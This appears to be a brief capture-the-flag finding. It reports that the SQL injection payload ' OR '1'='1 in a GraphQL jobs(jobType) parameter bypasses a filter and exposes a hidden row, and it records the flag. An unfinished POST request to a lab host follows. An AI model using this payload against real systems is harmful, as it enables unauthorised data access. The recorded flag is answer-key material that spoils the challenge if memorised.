# SQLi in jobs(jobType) parameter. Payload ' OR '1'='1 bypasses filter and returns all rows including hidden job with CTF flag: flag{3c8f1e0c-ed42-4e5f-a038-61d9c40b9fc9}

POST /graphql HTTP/1.1
Host: 172.17.0.1:54879
